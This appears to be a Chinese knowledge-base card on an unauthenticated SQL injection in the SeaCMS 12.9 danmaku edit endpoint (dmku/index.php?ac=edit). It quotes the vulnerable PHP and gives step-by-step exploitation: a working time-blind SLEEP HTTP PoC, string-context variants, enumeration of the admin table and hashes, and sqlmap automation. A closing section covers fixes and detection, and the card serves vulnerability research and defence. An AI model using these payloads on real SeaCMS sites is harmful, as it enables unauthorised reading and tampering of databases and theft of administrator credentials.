---
id: web-generic-sqli-seacms-dmku-unauth-danmaku-edit
title: SeaCMS 12.9 未授权 SQL 注入：dmku/index.php ac=edit 弹幕编辑直接拼接 cid/text/color
type: scenario
domain: web
path: web/generic/sqli
technique: seacms-dmku-unauth-danmaku-edit-sqli
tags:
- php
- seacms
- cms
- sqli
- unauthenticated
- time-blind
- mysqli
cve: []
severity: high
confidence: high
status: verified
affected_versions: SeaCMS 12.9（原文版本）
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T00:49:40+08:00'
  notes: 已对照原文与 img/08 核对：/js/player/dmplayer/dmku/index.php?ac=edit 无需登录，cid 无引号拼入两条 UPDATE 并用 mysqli::query 执行，PoC cid=(SELECT 1 FROM (SELECT SLEEP(6)) x) --&text=1&color=1 有 6 秒延迟截图；text/color 单引号上下文亦可注入。未复跑目标。dedup 候选 SeaCMS admin_members 注入为后台不同入口，非同链。
url: /docs/web/generic/sqli/web-generic-sqli-seacms-dmku-unauth-danmaku-edit/
draft: false
kb_aliases:
- 海洋CMS 未授权SQL注入
- dmku 弹幕SQL注入
- dmplayer index.php ac=edit
- 编辑_弹幕 SQL注入
- sea_danmaku_list 注入
- SeaCMS 12.9 SQLi
---

## 一句话结论

SeaCMS 12.9 的 `/js/player/dmplayer/dmku/index.php?ac=edit` 无需登录即可进入弹幕编辑逻辑，`编辑_弹幕($cid)` 把 `$_POST['cid']`、`$_POST['text']`、`$_POST['color']` 直接拼进两条 `UPDATE sea_danmaku_list/sea_danmaku_report` SQL 并用原生 `mysqli::query` 执行，没有 CheckSql/参数化；提交 `cid=(SELECT 1 FROM (SELECT SLEEP(6)) x) --&text=1&color=1` 即可时间盲注，未授权读取/篡改数据库。

## 原理

- 入口（原文）：
  ```php
  if ($_GET['ac'] == "edit") {
      $cid = $_POST['cid'] ?: showmessage(-1, null);
      $data = $d->编辑弹幕($cid) ?: succeedmsg(0, '完成');
      exit;
  }
  ```
  该文件位于静态播放器目录 `js/player/dmplayer/dmku/`，没有引入后台鉴权，任何能访问站点的人都能触发 `ac=edit`。
- 方法：
  ```php
  public static function 编辑_弹幕($cid) {
      global $_config;
      $text  = $_POST['text'];
      $color = $_POST['color'];
      $conn  = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'],
                           $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
      $sql    = "UPDATE sea_danmaku_list   SET text='$text',color='$color' WHERE cid=$cid";
      $result = "UPDATE sea_danmaku_report SET text='$text',color='$color' WHERE cid=$cid";
      $conn->query($sql);
      $conn->query($result);
  }
  ```
  - `cid` 无引号直接拼进 `WHERE cid=$cid`，可用括号/子查询/注释注入；
  - `text`/`color` 位于单引号字符串内，未 `addslashes`，也可注入字符串型 payload（如 `1',color=(SELECT ...)-- -`）；
  - 使用原生 `mysqli::query`，不经过 SeaCMS 的 `CheckSql`/`_RunMagicQuotes`，因此 `SLEEP`、子查询等关键字不被拦截；
  - 同一注入点执行两次 UPDATE（list 与 report 表），时间盲注会叠加延迟，回显/时间差异明显。
- 影响：未授权读取数据库（时间/报错/布尔盲注）、篡改弹幕表数据；若数据库账号权限较高，还可进一步写表、读配置等。

## 触发条件

- SeaCMS 12.9（原文版本）。
- 目标站点可访问 `/js/player/dmplayer/dmku/index.php`（播放器/弹幕组件随 CMS 部署）。
- 数据库配置可被该脚本读取（默认 `$_config`），数据库端口/账号可用。
- 无需任何登录会话；WAF 未拦截 `SLEEP`/子查询等（CheckSql 在该路径不生效）。

## 利用步骤

1. 直接请求 `ac=edit`，POST 提交带注入的 `cid`（或 `text`/`color`）。
2. 时间盲注验证：
   ```text
   cid=(SELECT 1 FROM (SELECT SLEEP(6)) x) --&text=1&color=1
   ```
   原文截图显示该请求触发 6 秒延迟。
3. 用布尔/时间盲注枚举库名、表名、`sea_admin` 等敏感表；或利用 `text`/`color` 的字符串上下文构造 UNION/子查询（取决于语句结构与 MySQL 版本）。
4. 篡改弹幕数据验证写权限；进一步可尝试读取管理员表哈希（经盲注）或按 DB 权限做文件写入。
5. 将 payload 保存为 sqlmap 请求文件（`-r`）可自动化利用。

## PoC

```http
POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cid=(SELECT 1 FROM (SELECT SLEEP(6)) x) --&text=1&color=1
```

字符串上下文变体：

```text
cid=1&text=1',color=(SELECT SLEEP(6))-- -&color=1
```

## 变体与关联

- 变体：`cid` 处可用 `IF(...,SLEEP(6),0)`、报错注入（`extractvalue`/`updatexml`，若未被过滤）、`UNION`（需适配 UPDATE 语句结构）；`text`/`color` 可做字符串型注入。
- 变体：同文件其他 `ac` 分支/其他 dmku 接口可能复用未过滤参数；可继续审计 `dmplayer` 目录。
- 关联：[[web-generic-sqli-seacms-admin-members-multi-param]]（SeaCMS 后台 SQLi）、[[web-generic-sqli-seacms-admin-datarelate-execute-none-query]]（SeaCMS 后台任意 SQL 执行）；同篇 SeaCMS 卡见 admin_ping 代码执行、admin_safe 任意文件下载。
- 注意：原文仅实测时间盲注（SLEEP），未展示数据枚举/写文件结果；利用深度取决于 DB 权限。

## 检测与防御

- 修复：所有 SQL 使用预处理/参数绑定（`mysqli::prepare` + `bind_param`），`cid` 强制 `intval`，`text`/`color` 转义并限制长度；对 `dmku` 管理接口增加鉴权/签名。
- 运行：生产环境移除或禁用 dmku 弹幕编辑接口；数据库账号最小权限；WAF 规则覆盖 `SLEEP`/子查询但不可作为唯一防线。
- 检测：监控 `/js/player/dmplayer/dmku/index.php?ac=edit` 的 POST 中出现 `SLEEP`、`SELECT`、注释符、引号；审计慢查询日志与异常 UPDATE；关注弹幕表被批量修改。
- 清理：修复后检查数据库中是否被写入恶意数据/管理员记录，排查同目录其他未授权接口。
